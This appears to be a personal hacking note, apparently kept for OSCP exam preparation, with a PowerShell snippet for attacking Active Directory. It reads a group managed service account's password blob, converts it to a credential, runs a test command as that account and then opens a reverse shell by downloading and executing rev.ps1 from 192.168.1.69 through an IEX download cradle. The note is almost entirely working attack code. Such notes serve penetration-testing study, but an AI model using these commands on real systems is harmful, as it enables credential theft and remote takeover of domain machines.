# active directory get GMSA service account properties get GMSA password and run commands
```powershell
# get password
$gmsa = Get-AdServiceAccount AccountUsername -properties msDS-ManagedPassword
$mp = $gmsa.'msDS-ManagedPassword'
# get secure string
$secpwd = (ConvertFrom-AdManagedPasswordBlob $mp).SecureCurrentPassword
$cred = New-Object System.Management.Automation.PSCredential('AccountUsername', $secpwd)
# test command
Invoke-Command -Computer 127.0.0.1 -Credential $cred -ScriptBlock { whoami }
# rev shell
Invoke-Command -Computer 127.0.0.1 -Credential $cred -ScriptBlock { IEX(New-Object Net.WebClient).downloadString('http://192.168.1.69/rev.ps1') }
```

` zet/20221003150485/README.md `

# Related

- [20221009005402](/zet/20221009005402/README.md) preparing for the OSCP exam
- [20221003150486](/zet/20221003150486/README.md) active directory get GMSA service account properties
- [20221003150484](/zet/20221003150484/README.md) active directory get GMSA service account properties get GMSA password and run commands fix missing ConvertFrom-AdManagedPasswordBlob
- ~/kb/hacking/powershell/powershell-enumeration-commands.md

Tags:

    #command #hacking #powershell 
